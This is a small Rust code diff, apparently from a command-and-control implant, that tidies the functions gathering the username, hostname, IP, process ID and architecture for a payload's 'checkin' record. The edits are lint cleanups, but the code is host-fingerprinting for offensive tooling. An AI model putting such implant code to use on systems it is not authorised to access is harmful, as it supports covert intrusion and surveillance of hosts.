@@ -38,7 +38,7 @@ pub mod whoami {
     pub fn username() -> Option<String> {
         let mut name_len = 0;
         // Call `GetUserNameW` to get the username length
-        let _ = unsafe {
+        unsafe {
             GetUserNameW(std::ptr::null_mut(), &mut name_len);
         };
 
@@ -71,7 +71,7 @@ pub mod whoami {
     pub fn hostname() -> Option<String> {
         let mut name_len = 0;
         // Get the computer name length
-        let _ = unsafe {
+        unsafe {
             GetComputerNameExW(ComputerNameDnsHostname, std::ptr::null_mut(), &mut name_len);
         };
 
@@ -278,10 +278,10 @@ pub fn get_checkin_info() -> String {
     // Grab the initial checkin information for Windows hosts
     let info = CheckinInfo {
         action: "checkin".to_string(),
-        ip: crate::utils::local_ipaddress::get().unwrap_or_else(|| "".to_string()),
+        ip: crate::utils::local_ipaddress::get().unwrap_or_default(),
         os: whoami::platform(),
-        user: whoami::username().unwrap_or_else(|| "".to_string()),
-        host: whoami::hostname().unwrap_or_else(|| "".to_string()),
+        user: whoami::username().unwrap_or_default(),
+        host: whoami::hostname().unwrap_or_default(),
         pid: std::process::id(),
         uuid: crate::payloadvars::payload_uuid(),
         architecture: std::env::consts::ARCH.to_string(),
